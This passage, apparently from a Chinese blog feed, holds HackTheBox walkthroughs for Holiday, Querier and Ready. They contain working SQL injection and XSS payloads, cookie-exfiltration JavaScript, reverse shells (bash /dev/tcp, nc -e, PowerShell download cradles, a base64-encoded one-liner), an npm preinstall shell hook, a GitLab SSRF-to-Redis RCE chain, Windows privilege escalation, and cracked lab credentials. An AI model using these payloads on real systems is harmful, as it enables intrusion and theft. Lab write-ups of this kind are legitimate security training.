    <url>/2021/05/14/HTB-Holiday/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Holiday/2.png" alt="2"></p>
<p>Web目录枚举，注意这里的浏览器UA，需要<code>--random-agent</code>参数，要不然要多枚举一遍 :(</p>
<p><img src="/images/Holiday/1.png" alt="1"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>唯一的起点是个登陆页面</p>
<p><img src="/images/Holiday/3.png" alt="3"></p>
<p>开始sql注入，首先</p>
<table>
<thead>
<tr>
<th>输入</th>
<th>返回</th>
</tr>
</thead>
<tbody><tr>
<td>‘</td>
<td>Invalid User</td>
</tr>
<tr>
<td>“</td>
<td>Error Occurred</td>
</tr>
</tbody></table>
<p>所以应该是存在sql注入，并且服务器端不喜欢双引号，单引号应该是业务逻辑正常</p>
<table>
<thead>
<tr>
<th>输入</th>
<th>返回</th>
</tr>
</thead>
<tbody><tr>
<td>“ or “1” = “1</td>
<td>Incorrect Password(并且返回用户名)</td>
</tr>
</tbody></table>
<p>接着尝试万能密码，返回<code>Incorrect Password</code>应该说明已经通过了用户名检测，但这里没有登陆:(<br> 不过神奇的是，输入窗口返回了一个疑似用户名的东西，看来这里的注入伴随着某种回显 ?</p>
<p>到这里，初步猜测的sql语句应该为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE password &#x3D; $INPUT and username &#x3D; &quot;$INPUT&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Holiday/4.png" alt="4"></p>
<table>
<thead>
<tr>
<th>输入</th>
<th>返回</th>
</tr>
</thead>
<tbody><tr>
<td>“ or 1=1–</td>
<td>Error Occurred</td>
</tr>
</tbody></table>
<p>服务端拒绝了请求，看来猜测的SQL语句存在问题。思考了一会儿进行了如下尝试</p>
<table>
<thead>
<tr>
<th>输入</th>
<th>返回</th>
</tr>
</thead>
<tbody><tr>
<td>“) or 1=1–</td>
<td>Error Occurred</td>
</tr>
<tr>
<td>“)) or 1=1–</td>
<td>Incorrect Password(并且返回用户名)</td>
</tr>
</tbody></table>
<p>哈，做到这里就比较清晰了，<code>&quot;))</code>再次绕过了用户名检测，所以后端语句可能为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE password &#x3D; $INPUT and username &#x3D; ((&quot;$INPUT&quot;))</span><br></pre></td></tr></table></figure>

<p>考虑到回显，继续尝试字段数的判断</p>
<table>
<thead>
<tr>
<th>输入</th>
<th>返回</th>
</tr>
</thead>
<tbody><tr>
<td>“)) order by 1–</td>
<td>Invalid User</td>
</tr>
<tr>
<td>“)) order by 4–</td>
<td>Invalid User</td>
</tr>
<tr>
<td>“)) order by 5–</td>
<td>Error Occurred</td>
</tr>
</tbody></table>
<p>所以字段数为4，继续考虑union注入，payload:<code>&quot;)) UNION SELECT 1,2,3,4--</code></p>
<p><img src="/images/Holiday/5.png" alt="5"></p>
<p>到这里，基本就算成功了，返回的是第2个字段，继续枚举数据库payload:<code>&quot;)) UNION SELECT 1,sqlite_version(),3,4--</code></p>
<p><img src="/images/Holiday/6.png" alt="6"></p>
<p>知道了后端数据库为sqlite，非常有价值，所以注意sqlite里的注释符为<code>--</code></p>
<p>枚举表名</p>
<table>
<thead>
<tr>
<th>payload</th>
<th>表名</th>
</tr>
</thead>
<tbody><tr>
<td>“)) UNION SELECT 1,tbl_name,3,4 FROM sqlite_master WHERE type=’table’ and tbl_name NOT like ‘sqlite_%’ limit 1 offset 1–</td>
<td>notes</td>
</tr>
<tr>
<td>“)) UNION SELECT 1,tbl_name,3,4 FROM sqlite_master WHERE type=’table’ and tbl_name NOT like ‘sqlite_%’ limit 1 offset 2–</td>
<td>sessions</td>
</tr>
<tr>
<td>“)) UNION SELECT 1,tbl_name,3,4 FROM sqlite_master WHERE type=’table’ and tbl_name NOT like ‘sqlite_%’ limit 1 offset 3–</td>
<td>users</td>
</tr>
<tr>
<td>“)) UNION SELECT 1,tbl_name,3,4 FROM sqlite_master WHERE type=’table’ and tbl_name NOT like ‘sqlite_%’ limit 2 offset 1–</td>
<td>notes</td>
</tr>
<tr>
<td>“)) UNION SELECT 1,tbl_name,3,4 FROM sqlite_master WHERE type=’table’ and tbl_name NOT like ‘sqlite_%’ limit 3 offset 2–</td>
<td>sessions</td>
</tr>
</tbody></table>
<p>枚举users表字段,payload:<code>&quot;)) UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE type!=&#39;meta&#39; AND sql NOT NULL AND name =&#39;users&#39;--</code></p>
<p>返回:<code>CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT,username TEXT,password TEXT,active TINYINT(1))</code></p>
<p>username和password看起来比较有趣</p>
<table>
<thead>
<tr>
<th>payload</th>
<th>数据</th>
</tr>
</thead>
<tbody><tr>
<td>“)) UNION SELECT 1,username,3,4 FROM users–</td>
<td>RickA</td>
</tr>
<tr>
<td>“)) UNION SELECT 1,password,3,4 FROM users–</td>
<td>fdc8cd4cff2c19e0d1022e78481ddf36</td>
</tr>
</tbody></table>
<p><img src="/images/Holiday/7.png" alt="7"></p>
<p>使用凭据<code>RickA/nevergonnagiveyouup</code>成功登陆</p>
<p>在Notes处看到留言板，并且管理员会查看</p>
<p><img src="/images/Holiday/8.png" alt="8"></p>
<p>看来是一个XSS盲打，不过这里存在过滤器</p>
<table>
<thead>
<tr>
<th>Payload</th>
<th>过滤后</th>
</tr>
</thead>
<tbody><tr>
<td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
<td><code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code></td>
</tr>
<tr>
<td><code>&lt;svg onload=alert(1)&gt;&lt;/svg&gt;</code></td>
<td><code>&amp;lt;svg onload=alert(1)&amp;gt;&amp;lt;/svg&amp;gt;</code></td>
</tr>
<tr>
<td><code>&lt;img src=&quot;#&quot;&gt;</code></td>
<td><code>&lt;img src=#&gt;</code></td>
</tr>
</tbody></table>
<p>绕过这个过滤器需要2个操作。第一个是xss payload的结构，使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;&#x2F;&gt;&lt;script&gt;JAVASCRIPT CODE&lt;&#x2F;script&gt;&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>绕过的原理应该是把JavaScript代码作为URL，所以没有过滤</p>
<p>第二个是JavaScript编码，这里使用String.fromCharCode配合Unicode编码，这样可以避免引号，Unicode使用如下脚本生成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def decoder(ascii):</span><br><span class="line">    decimal&#x3D;&quot;&quot;</span><br><span class="line">    for char in ascii:</span><br><span class="line">        decimal +&#x3D; str((ord(char)))+&quot;,&quot;</span><br><span class="line">    return decimal[:-1]</span><br><span class="line"></span><br><span class="line">print(decoder(&quot;&quot;&quot;document.write(&#39;&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;10.10.16.12&#x2F;ajax.js&quot;&gt;&lt;&#x2F;script&gt;&#39;);&quot;&quot;&quot;))</span><br></pre></td></tr></table></figure>

<p>最后的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;x&#x2F;&gt;&lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,54,46,49,50,47,97,106,97,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41))&lt;&#x2F;script&gt;&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>获得了客户端请求</p>
<p><img src="/images/Holiday/9.png" alt="9"></p>
<p>为了窃取页面的cookie，编写ajax如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var req1&#x3D;new XMLHttpRequest();</span><br><span class="line">req1.open(&#39;GET&#39;,&#39;http:&#x2F;&#x2F;localhost:8000&#x2F;vac&#x2F;8dd841ff-3f44-4f2b-9324-9a833e2c6b65&#39;,false)</span><br><span class="line">req1.send()</span><br><span class="line">var response&#x3D;req1.responseText</span><br><span class="line">var req2&#x3D;new XMLHttpRequest()</span><br><span class="line">var params&#x3D;encodeURI(response)</span><br><span class="line">req2.open(&#39;POST&#39;,&#39;http:&#x2F;&#x2F;10.10.16.12:8080&#x2F;&#39;)</span><br><span class="line">req2.setRequestHeader(&quot;Content-type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;)</span><br><span class="line">req2.send(params)</span><br></pre></td></tr></table></figure>

<p>之后再次触发即可</p>
<p><img src="/images/Holiday/10.png" alt="10"></p>
<p>解码得到页面，可以发现，之前输入的payload的引号在盲打过滤之后都消失了，这导致了js的执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;x&gt;&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,39,116,101,115,116,39,41,59))&lt;&#x2F;script&gt; &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>从页面中，我们可以提取到cookie</p>
<p><img src="/images/Holiday/11.png" alt="11"></p>
<p>替换cookie，获得admin</p>
<p><img src="/images/Holiday/12.png" alt="12"></p>
<p>查看之前没权限进入的管理员面板</p>
<p><img src="/images/Holiday/13.png" alt="13"></p>
<p>查看两个按钮的请求后，发现一处疑似命令注入</p>
<p><img src="/images/Holiday/14.png" alt="14"></p>
<p>这里就简单了，提示了&amp;(%26)可用</p>
<p><img src="/images/Holiday/15.png" alt="15"></p>
<p>反弹shell遇到了麻烦，因为<code>.</code>不可用，这里需要将ip地址转换为HEX:<a href="https://www.browserling.com/tools/ip-to-hex">链接</a></p>
<p>之后运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">notes%26wget+0x0a0a100c&#x2F;shell</span><br><span class="line">notes%26bash+shell</span><br></pre></td></tr></table></figure>

<p><img src="/images/Holiday/16.png" alt="16"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>看到2个post，一个可以读文件，<a href="https://github.com/frizb/Linux-Privilege-Escalation">链接</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s &#x2F;etc&#x2F;shadow package.json</span><br><span class="line">sudo &#x2F;user&#x2F;bin&#x2F;npm i *</span><br></pre></td></tr></table></figure>

<p><img src="/images/Holiday/18.png" alt="18"></p>
<p>另一个可以RCE，<a href="https://github.com/joaojeronimo/rimrafall">链接</a>，完整过程如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir evil</span><br><span class="line">cd evil</span><br><span class="line">vim package.json</span><br></pre></td></tr></table></figure>

<p>内容如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;rimrafall&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;1.0.0&quot;,</span><br><span class="line">  &quot;description&quot;: &quot;rm -rf &#x2F;* # DO NOT INSTALL THIS&quot;,</span><br><span class="line">  &quot;main&quot;: &quot;index.js&quot;,</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;preinstall&quot;: &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.12&#x2F;4444 0&gt;&amp;1&#39;&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;keywords&quot;: [</span><br><span class="line">    &quot;rimraf&quot;,</span><br><span class="line">    &quot;rmrf&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;author&quot;: &quot;João Jerónimo&quot;,</span><br><span class="line">  &quot;license&quot;: &quot;ISC&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ..</span><br><span class="line">sudo &#x2F;usr&#x2F;bin&#x2F;npm i evil&#x2F; --unsafe</span><br></pre></td></tr></table></figure>

<p><img src="/images/Holiday/19.png" alt="19"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Querier</title>
    <url>/2021/05/24/HTB-Querier/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Querier/1.png" alt="1"></p>
<p>smb枚举还行啦了<code>Reports</code>目录可读</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb -u anonymous -p anoymous --shares 10.10.10.125 -d localhost</span><br></pre></td></tr></table></figure>

<p><img src="/images/Querier/2.png" alt="1"></p>
<p>其中只有一个Excel文件，下载下来</p>
<p><img src="/images/Querier/3.png" alt="3"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>xlsm扩展名表示这个Excel里面有宏脚本，所以我安装<a href="https://github.com/decalage2/oletools">oletools</a>来读取它</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">olevba macro.xlsm</span><br></pre></td></tr></table></figure>

<p><img src="/images/Querier/4.png" alt="4"></p>
<p>得到凭据<code>reporting/PcwTWTHRwryjc$c6</code></p>
<p>除此之外，可以解压xlsm文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span> macro.xlsm                                             </span><br><span class="line">macro.xlsm: Microsoft Excel 2007+</span><br><span class="line"></span><br><span class="line"><span class="variable">$unzip</span> macro.xlsm                                      </span><br><span class="line">Archive:  macro.xlsm</span><br><span class="line">  inflating: [Content_Types].xml     </span><br><span class="line">  inflating: _rels/.rels             </span><br><span class="line">  inflating: xl/workbook.xml         </span><br><span class="line">  inflating: xl/_rels/workbook.xml.rels  </span><br><span class="line">  inflating: xl/worksheets/sheet1.xml  </span><br><span class="line">  inflating: xl/theme/theme1.xml     </span><br><span class="line">  inflating: xl/styles.xml           </span><br><span class="line">  inflating: xl/vbaProject.bin       </span><br><span class="line">  inflating: docProps/core.xml       </span><br><span class="line">  inflating: docProps/app.xml</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> xl/vbaProject.bin                                     </span><br><span class="line">xl/vbaProject.bin: Composite Document File V2 Document, Cannot <span class="built_in">read</span> section info</span><br></pre></td></tr></table></figure>

<p>宏脚本一般存储在vbaProject.bin，可以用strings来提取它的ASCII</p>
<p><img src="/images/Querier/5.png" alt="5"></p>
<p>这里凭据不能使用<code>sqsh</code>或者<code>mssql-cli</code>这样的工具连接，但可以通过impacket的<code>mssqlclient.py</code>指定<code>-windows-auth</code>参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mssqlclient.py reporting:&#39;PcwTWTHRwryjc$c6&#39;@10.10.10.125 -windows-auth</span><br></pre></td></tr></table></figure>

<p><img src="/images/Querier/6.png" alt="6"></p>
<p><code>mssqlclient.py</code>可以通过命令打开<code>xp_cmdshell</code>，比较方便，但是这里权限不足</p>
<p><img src="/images/Querier/7.png" alt="7"></p>
<p>和<code>HTB:Giddy</code>一样，尝试通过<code>Responder</code>窃取用户的NTLMv2 HASH</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">responder -I tun0</span><br></pre></td></tr></table></figure>

<p>在目标上执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xp_dirtree &#39;\\10.10.16.12\hash&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Querier/8.png" alt="8"></p>
<p>之前使用john，这次尝试使用hashcat</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600 hash &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p>得到凭据<code>MSSQL-SVC/corporate568</code></p>
<p><img src="/images/Querier/9.png" alt="9"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mssqlclient.py MSSQL-SVC:&#39;corporate568&#39;@10.10.10.125 -windows-auth</span><br></pre></td></tr></table></figure>

<p>连接成功，并确认当前用户拥有DBA权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select IS_SRVROLEMEMBER (&#39;sysadmin&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/Querier/10.png" alt="10"></p>
<p>这表示我们可以使用xp_cmdshell了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">enable_xp_cmdshellxp_cmdshell whoami</span><br></pre></td></tr></table></figure>

<p><img src="/images/Querier/11.png" alt="11"></p>
<p>这里反弹shell注意转义和单双引号，否则容易出现语法问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xp_cmdshell Powershell iex(new-object net.webclient).downloadString(\&quot;http:&#x2F;&#x2F;10.10.16.12&#x2F;Invoke-PowerShellTcp.ps1\&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/Querier/12.png" alt="12"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>Powerup发现DLL劫持，不过没有机会能够重启该服务</p>
<p><img src="/images/Querier/25.png" alt="25"></p>
<h2 id="方法1-Restart-Service-UsoSvc"><a href="#方法1-Restart-Service-UsoSvc" class="headerlink" title="方法1 Restart-Service UsoSvc"></a>方法1 Restart-Service UsoSvc</h2><p>accesschk发现当前用户对服务<code>UsoSvc</code>具有完全控制权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uwcqv &quot;service&quot; UsoSvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/Querier/18.png" alt="18"></p>
<p>修改路径，重启服务即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc.exe config UsoSvc binpath&#x3D; &quot;C:\Users\Public\Documents\nc.exe 10.10.16.12 5555 -e cmd&quot;Restart-Service UsoSvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/Querier/19.png" alt="19"></p>
<h2 id="方法2-RouguePotato"><a href="#方法2-RouguePotato" class="headerlink" title="方法2 RouguePotato"></a>方法2 RouguePotato</h2><p>发现用户具有<code>SeImpersonatePrivilege</code></p>
<p><img src="/images/Querier/14.png" alt="14"></p>
<p>不过操作系统为<code>Windows Server 2019</code>，这就需要使用RouguePotato</p>
<p><img src="/images/Querier/15.png" alt="15"></p>
<p>kali进行端口转发，将欺骗135端口的流量转发到目标的Oxid resolver</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.125:9999</span><br></pre></td></tr></table></figure>

<p>最后在目标机器上执行RoguePotato即可，注意选择合适的CLSID</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\roguepotato.exe -r 10.10.16.12 -e &quot;cmd &#x2F;c powershell iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.12&#x2F;Invoke-PowerShellTcp2.ps1&#39;)&quot; -l 9999 -c &quot;&#123;B91D5831-B1BD-4608-8198-D72E155020F7&#125;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Querier/13.png" alt="13"></p>
<h2 id="方法3-Group-Policy-Preferences-GPP"><a href="#方法3-Group-Policy-Preferences-GPP" class="headerlink" title="方法3 Group Policy Preferences (GPP)"></a>方法3 Group Policy Preferences (GPP)</h2><p>winpeas可以发现GPP的凭据，并自动对其进行解密</p>
<p><img src="/images/Querier/16.png" alt="16"></p>
<p>这篇<a href="https://www.mindpointgroup.com/blog/pen-test/privilege-escalation-via-group-policy-preferences-gpp/">文章</a>很好描述了漏洞产生的原因</p>
<p>查看<code>PowerUp.ps1</code>的<code>Get-CachedGPPPassword</code>函数，可以发现其原理。它会去寻找可能存储密码的XML文件，正则提取密码部分，再用微软公开的AES Key解密</p>
<p><img src="/images/Querier/20.png" alt="20"></p>
<p>我们可以手动完成枚举和解密。首先寻找文件，比如这里的Groups/xml</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd &#x2F;c &quot;dir &#x2F;s &#x2F;b C: | findstr Groups.xml&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Querier/21.png" alt="21"></p>
<p>查看内容，提取密码部分</p>
<p><img src="/images/Querier/22.png" alt="22"></p>
<p>使用<a href="https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py">链接</a>进行破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python Gpprefdecrypt.py CiDUq6tbrBL1m&#x2F;js9DmZNIydXpsE69WB9JrhwYRW9xywOz1&#x2F;0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ</span><br></pre></td></tr></table></figure>

<p><img src="/images/Querier/23.png" alt="23"></p>
<p>得到<code>MyUnclesAreMarioAndLuigi!!1!</code>。之后WinRM或者PTH都行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.125 -u administrator -p &#39;MyUnclesAreMarioAndLuigi!!1!&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Querier/24.png" alt="24"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Ready</title>
    <url>/2021/05/18/HTB-Ready/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Ready/1.png" alt="1"></p>
<p>5080端口发现Gitlab，允许注册账户</p>
<p><img src="/images/Ready/2.png" alt="2"></p>
<p>注册账户后在Help处发现版本<code>11.4.7</code></p>
<p><img src="/images/Ready/3.png" alt="3"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>谷歌搜索对应版本漏洞，可以在EDB里发现<code>CVE-2018-19571</code>和<code>CVE-2018-19585</code>，看起来是两个漏洞组合，构成了RCE</p>
<p><img src="/images/Ready/4.png" alt="4"></p>
<p>python脚本工作正常，可以快速拿到shell，这里演示手动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 49334.py -u arsene -p arsene123 -g http:&#x2F;&#x2F;10.10.10.220 -l 10.10.16.12 -P 443</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2018-19571"><a href="#CVE-2018-19571" class="headerlink" title="CVE-2018-19571"></a>CVE-2018-19571</h2><p>可以在gitlab的Commit里找到有问题的代码部分:<a href="https://gitlab.com/gitlab-org/gitlab-foss/-/commit/a9f5b22394954be8941566da1cf349bb6a179974">链接</a></p>
<p>之后在这篇文章里找到利用的方式，提到了关于:<a href="https://gitlab.com/gitlab-org/gitlab-foss/-/issues/53242">链接</a></p>
<p>漏洞的触发点在<code>import project</code>里<code>Repo by URL</code>的仓库链接处，首先输入一个常规的地址</p>
<p><img src="/images/Ready/5.png" alt="5"></p>
<p>得到响应，这就是文章所说的SSRF的地方，但在测试之前，我们需要能够控制TCP Stream</p>
<p><img src="/images/Ready/6.png" alt="6"></p>
<p>灵活的SSRF利用大多数使用Gopher协议，但是这里不允许使用它，不过可以使用Git协议</p>
<p><img src="/images/Ready/7.png" alt="7"></p>
<p>故技重施，尝试接收Git协议的请求。注意git协议的格式类似<code>git://10.10.16.12:80/evil/evil.git</code>，否则收不到请求</p>
<p><img src="/images/Ready/8.png" alt="8"></p>
<p>成功收到请求</p>
<p><img src="/images/Ready/9.png" alt="9"></p>
<p>尝试请求本地链接，这里就是CVE利用的地方，这里可以猜测请求是否发出，如果输入一个正常的本地地址请求，如<code>git://127.0.0.1:80/test/test.git</code>我们会得到错误响应</p>
<p><img src="/images/Ready/13.png" alt="13"></p>
<p>使用CVE的IPv6的PoC，<code>git://[0:0:0:0:0:ffff:127.0.0.1]:9100/test/test.git</code>项目被成功创建，PoC应该就成功了</p>
<p><img src="/images/Ready/14.png" alt="14"></p>
<h2 id="CVE-2018-19585"><a href="#CVE-2018-19585" class="headerlink" title="CVE-2018-19585"></a>CVE-2018-19585</h2><p>这是一个CRLF注入的问题，我们基于之前的SSRF进行测试</p>
<p>抓取之前的git协议的请求</p>
<p><img src="/images/Ready/10.png" alt="10"></p>
<p>添加CRLF</p>
<p><img src="/images/Ready/11.png" alt="11"></p>
<p>得到理想中的响应，正式CRLF注入的存在</p>
<p><img src="/images/Ready/12.png" alt="12"></p>
<h2 id="RCE-Chain"><a href="#RCE-Chain" class="headerlink" title="RCE Chain"></a>RCE Chain</h2><p>之前文章的下方发现了另一篇关于如何RCE的文章:<a href="https://gitlab.com/gitlab-org/gitlab-foss/-/issues/41293">链接</a></p>
<p>修改SSRF目的地6379端口<code>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test/.git</code>，添加PoC<code>whoami | nc 10.10.16.12 80</code>测试是否正常运行。完整如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git%3a&#x2F;&#x2F;[0%3a0%3a0%3a0%3a0%3affff%3a127.0.0.1]%3a6379&#x2F;test&#x2F;.git</span><br><span class="line"> multi</span><br><span class="line"> sadd resque:gitlab:queues system_hook_push</span><br><span class="line"> lpush resque:gitlab:queue:system_hook_push &quot;&#123;\&quot;class\&quot;:\&quot;GitlabShellWorker\&quot;,\&quot;args\&quot;:[\&quot;class_eval\&quot;,\&quot;open(\&#39;|whoami | nc 10.10.16.12 80\&#39;).read\&quot;],\&quot;retry\&quot;:3,\&quot;queue\&quot;:\&quot;system_hook_push\&quot;,\&quot;jid\&quot;:\&quot;ad52abc5641173e217eb2e52\&quot;,\&quot;created_at\&quot;:1513714403.8122594,\&quot;enqueued_at\&quot;:1513714403.8129568&#125;&quot;</span><br><span class="line"> exec</span><br></pre></td></tr></table></figure>

<p>RCE成功</p>
<p><img src="/images/Ready/15.png" alt="15"></p>
<p>这里测试PoC不要用ping，后来会发现它处于Docker中，也就是没有<code>network-tools</code>，修改payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo -n L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTIvNDQ0NCAwPiYxIg&#x3D;&#x3D; |base64 -d |bash</span><br></pre></td></tr></table></figure>

<p><img src="/images/Ready/16.png" alt="16"></p>
<p>成功获得shell</p>
<p><img src="/images/Ready/17.png" alt="17"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>缺失很多命令，检查为docker环境</p>
<p><img src="/images/Ready/18.png" alt="18"></p>
<h2 id="dockker-root"><a href="#dockker-root" class="headerlink" title="dockker root"></a>dockker root</h2><p>在<code>/opt/backup</code>发现有趣的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git@gitlab:&#x2F;opt&#x2F;backup$ ls</span><br><span class="line">docker-compose.yml  gitlab-secrets.json  gitlab.rb</span><br></pre></td></tr></table></figure>

<p>在gitlab.rc(gitlab的配置文件里)发现了SMTP密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git@gitlab:&#x2F;opt&#x2F;backup$ cat gitlab.rb| grep -v &quot;^#&quot; |grep .</span><br><span class="line">gitlab_rails[&#39;smtp_password&#39;] &#x3D; &quot;wW59U!ZKMbG9+*#h&quot;</span><br></pre></td></tr></table></figure>

<p>使用它成功提升到docker的root权限</p>
<p><img src="/images/Ready/19.png" alt="19"></p>
<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>在<code>docker-compose.yml</code>里发现了有趣的信息<code>privileged: true</code>标识容器的root权限和实体机的root权限相同</p>
<p><img src="/images/Ready/20.png" alt="20"></p>
<p>枚举磁盘设备信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@gitlab:&#x2F;tmp# lsblk</span><br><span class="line">NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop1    7:1    0 55.5M  1 loop </span><br><span class="line">loop4    7:4    0 31.1M  1 loop </span><br><span class="line">loop2    7:2    0 31.1M  1 loop </span><br><span class="line">loop0    7:0    0 55.4M  1 loop </span><br><span class="line">sda      8:0    0   20G  0 disk </span><br><span class="line">|-sda2   8:2    0   18G  0 part &#x2F;var&#x2F;opt&#x2F;gitlab</span><br><span class="line">|-sda3   8:3    0    2G  0 part [SWAP]</span><br><span class="line">&#96;-sda1   8:1    0    1M  0 part </span><br><span class="line">loop5    7:5    0 71.3M  1 loop </span><br><span class="line">loop3    7:3    0 71.4M  1 loop</span><br></pre></td></tr></table></figure>

<p>挂载磁盘</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@gitlab:&#x2F;tmp# mkdir escape</span><br><span class="line">root@gitlab:&#x2F;tmp# mount &#x2F;dev&#x2F;sda2 escape </span><br><span class="line">root@gitlab:&#x2F;tmp# cd escape&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Ready/21.png" alt="21"></p>
<p>这样就可以读取宿主机上的root的文件了，通过私钥ssh过去即可</p>
<p><img src="/images/Ready/22.png" alt="22"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Redcross</title>
    <url>/2020/10/29/HTB-Redcross/</url>
    <content><![CDATA[<h1 id="Redcross"><a href="#Redcross" class="headerlink" title="Redcross"></a>Redcross</h1><p>我觉得非常有意思的一台，有多种攻击路线，还能用到XSS，而且难度不是很高</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>添加hosts</p>
